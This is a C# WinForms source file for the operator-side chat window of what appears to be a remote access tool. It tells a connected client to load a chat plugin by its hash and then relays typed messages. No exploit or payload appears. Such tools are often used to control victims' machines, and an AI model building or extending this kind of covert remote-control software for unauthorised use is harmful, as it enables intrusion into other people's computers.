using Server.MessagePack;
using Server.Connection;
using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using Server.Helper;
using System.IO;

namespace Server.Forms
{
    public partial class FormChat : Form
    {
        public Form1 F { get; set; }
        public Clients Client { get; set; }
        public Clients ParentClient { get; set; }

        private string Nickname = "Admin";
        public FormChat()
        {
            InitializeComponent();
        }

        private void TextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.Enter && !string.IsNullOrWhiteSpace(textBox1.Text))
            {
                try
                {
                    richTextBox1.AppendText("ME: " + textBox1.Text + Environment.NewLine);
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "chatWriteInput";
                    msgpack.ForcePathObject("Input").AsString = Nickname + ": " + textBox1.Text;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                    textBox1.Clear();
                }
                catch { }
            }
        }

        private void FormChat_Load(object sender, EventArgs e)
        {
            try
            {
                string nick = Interaction.InputBox("TYPE YOUR NICKNAME", "CHAT", "Admin");
                if (string.IsNullOrEmpty(nick))
                    this.Close();
                else
                {
                    Nickname = nick;
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "plugin";
                    msgpack.ForcePathObject("Command").AsString = "invoke";
                    msgpack.ForcePathObject("Hash").AsString = Methods.GetHash(Path.Combine(Application.StartupPath, "Plugin", "PluginChat.dll"));
                    ThreadPool.QueueUserWorkItem(ParentClient.Send, msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void FormChat_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                Client?.Disconnected();
            }
            catch { }
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Client.TcpClient.Connected) this.Close();
            }
            catch { }
        }
    }
}
